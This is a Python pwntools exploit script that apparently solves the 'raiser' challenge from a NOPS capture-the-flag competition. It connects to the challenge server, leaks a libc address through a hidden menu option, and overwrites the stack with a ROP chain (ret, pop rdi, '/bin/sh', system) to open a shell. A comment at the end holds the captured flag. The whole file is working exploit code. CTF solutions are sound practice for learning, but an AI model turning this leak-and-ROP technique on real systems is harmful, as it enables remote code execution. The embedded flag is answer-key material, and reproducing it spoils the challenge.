from pwn import *
from icecream import ic

exe = ELF("./raiser_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("nopsctf-936d8b265496-raiser-1.chals.io", 443, ssl=True, sni="nopsctf-936d8b265496-raiser-1.chals.io")
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000012bf
pie b 0x0000000000001328
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(ind):
    ru("> ")
    sl(f'{0x539}'.encode())
    ru("> ")
    sl(f'{ind}'.encode())
    ru("You found the hidden History feature!\n")
    return rl().decode().strip()

def write(val):
    ru("> ")
    sl(f'{val}'.encode())
    ru("> ")
    sl(b'1')

libc.address = int(leak(19)) - 0x28150
ic(hex(libc.address))

for i in range(19):
    write(1)

pop_rdi = libc.address + 0x0000000000028795
ret = libc.address + 0x0000000000112d37
binsh = libc.address + 0x1c041b

write(ret)
write(pop_rdi)
write(binsh)
write(libc.sym['system'])


ru("> ")
sl(b'9999999999')
ru("> ")
sl(b'9999999999')

# flag = N0PS{wHa7_w3_LOv3_41waYs_3sC4peS_fR0m_u5!}
io.interactive()
